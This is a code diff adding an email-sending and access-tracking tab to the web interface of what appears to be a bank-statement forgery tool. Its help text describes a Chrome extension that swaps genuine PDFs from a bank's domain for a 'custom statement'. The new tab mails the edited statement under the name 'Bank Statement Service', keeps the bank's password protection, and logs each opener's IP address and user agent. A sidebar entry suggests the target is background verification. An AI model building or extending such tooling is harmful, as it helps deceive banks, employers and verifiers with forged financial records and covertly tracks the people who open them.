@@ -40,6 +40,9 @@
     <div class="sidebar-item" data-tab="bgv">
       <span class="sidebar-icon">&#128737;</span> BGV Verification
     </div>
+    <div class="sidebar-item" data-tab="email-send">
+      <span class="sidebar-icon">&#9993;</span> Email & Tracking
+    </div>
   </div>
 
   <div class="main-content">
@@ -505,6 +508,132 @@
           <div class="help-step"><div class="help-num">3</div><div>Click <strong>Load unpacked</strong> &rarr; select <code>extension/</code> folder</div></div>
           <div class="help-step"><div class="help-num">4</div><div>Click extension icon &rarr; enter bank domain &amp; account ID &rarr; Save</div></div>
           <div class="help-step"><div class="help-num">5</div><div>Done! Any PDF from your bank domain is now replaced with your custom statement</div></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ========== EMAIL & TRACKING TAB ========== -->
+    <div id="tab-email-send" class="tab-content">
+      <div class="card">
+        <div class="card-header">
+          <h2>Email Configuration (SMTP)</h2>
+          <span class="card-hint">Configure SMTP to send edited PDFs via email</span>
+        </div>
+        <div class="card-body">
+          <div id="emailConfigStatus" class="upload-status" style="display:none"></div>
+          <p class="bgv-info-text">Set up your email SMTP settings so you can send the edited PDF statement back to any email address. Works with Gmail, Outlook, Yahoo, etc.</p>
+          <div class="form-row">
+            <div class="form-group">
+              <label>SMTP Host</label>
+              <input type="text" id="smtpHost" value="smtp.gmail.com" placeholder="smtp.gmail.com">
+            </div>
+            <div class="form-group">
+              <label>Port</label>
+              <input type="text" id="smtpPort" value="587" placeholder="587">
+            </div>
+          </div>
+          <div class="form-row">
+            <div class="form-group">
+              <label>Email Address (Username)</label>
+              <input type="text" id="smtpUsername" placeholder="your-email@gmail.com">
+            </div>
+            <div class="form-group">
+              <label>Password / App Password</label>
+              <input type="password" id="smtpPassword" placeholder="App-specific password">
+              <span class="field-hint">For Gmail: use App Password (not your regular password). Generate at myaccount.google.com/apppasswords</span>
+            </div>
+          </div>
+          <div class="form-row">
+            <div class="form-group">
+              <label>From Name</label>
+              <input type="text" id="smtpFromName" value="Bank Statement Service" placeholder="Display name">
+            </div>
+            <div class="form-group">
+              <label>&nbsp;</label>
+              <label style="display:flex;align-items:center;gap:8px;cursor:pointer;">
+                <input type="checkbox" id="smtpUseSsl" checked> Use SSL/TLS
+              </label>
+            </div>
+          </div>
+          <button class="btn btn-primary" onclick="saveEmailConfig()">Save Email Configuration</button>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-header">
+          <h2>Send Edited PDF via Email</h2>
+          <span class="card-hint">Send the replacement PDF to any email address</span>
+        </div>
+        <div class="card-body">
+          <p class="bgv-info-text">Enter the email address where you want to send the edited PDF statement. The PDF will be attached to the email with the bank's password protection.</p>
+          <div class="form-row">
+            <div class="form-group">
+              <label>Send To (Email Address)</label>
+              <input type="email" id="sendToEmail" placeholder="recipient@email.com">
+              <span class="field-hint">This can be the same email that received the original bank statement</span>
+            </div>
+            <div class="form-group">
+              <label>Account ID</label>
+              <input type="text" id="sendAccountId" value="1234567890" placeholder="Account number">
+            </div>
+          </div>
+          <div class="form-row">
+            <div class="form-group">
+              <label>Bank Name</label>
+              <input type="text" id="sendBankName" value="HDFC Bank" placeholder="Bank name">
+            </div>
+            <div class="form-group">
+              <label>Account Holder</label>
+              <input type="text" id="sendHolderName" value="Rahul Sharma" placeholder="Account holder name">
+            </div>
+          </div>
+          <button class="btn btn-primary btn-full" onclick="sendStatementEmail()">
+            &#9993; Send Edited PDF via Email
+          </button>
+          <div id="sendEmailResult" class="upload-status" style="display:none"></div>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-header">
+          <h2>PDF Access Tracking</h2>
+          <span class="card-hint">See when your statement PDFs are opened/downloaded</span>
+          <div class="card-actions">
+            <button class="btn btn-sm btn-outline" onclick="refreshAccessLog()">&#8635; Refresh</button>
+          </div>
+        </div>
+        <div class="card-body">
+          <div class="form-group">
+            <label>Filter by Account ID (leave empty for all)</label>
+            <input type="text" id="accessLogFilter" placeholder="Filter by account ID">
+          </div>
+          <div id="accessLogStats" style="display:none;margin-bottom:16px;"></div>
+        </div>
+        <div class="card-body p-0">
+          <table class="data-table">
+            <thead>
+              <tr>
+                <th>Time</th>
+                <th>Account ID</th>
+                <th>IP Address</th>
+                <th>Source</th>
+                <th>User Agent</th>
+              </tr>
+            </thead>
+            <tbody id="accessLogBody">
+              <tr><td colspan="5" style="text-align:center;padding:30px;color:#999">Click Refresh to load access logs</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-header"><h2>How Email &amp; Tracking Works</h2></div>
+        <div class="card-body">
+          <div class="help-step"><div class="help-num">1</div><div><strong>Configure SMTP</strong> &mdash; Enter your Gmail/Outlook SMTP settings above. For Gmail, generate an App Password at myaccount.google.com/apppasswords.</div></div>
+          <div class="help-step"><div class="help-num">2</div><div><strong>Edit Statement</strong> &mdash; Go to Statement Editor tab, create/edit your bank statement.</div></div>
+          <div class="help-step"><div class="help-num">3</div><div><strong>Send via Email</strong> &mdash; Enter the recipient email (same email that got the original statement), and click Send. The edited PDF is attached.</div></div>
+          <div class="help-step"><div class="help-num">4</div><div><strong>Track Access</strong> &mdash; When someone opens your statement PDF via the Chrome Extension intercept, it's logged here. You'll see the timestamp, IP, and source.</div></div>
         </div>
       </div>
     </div>
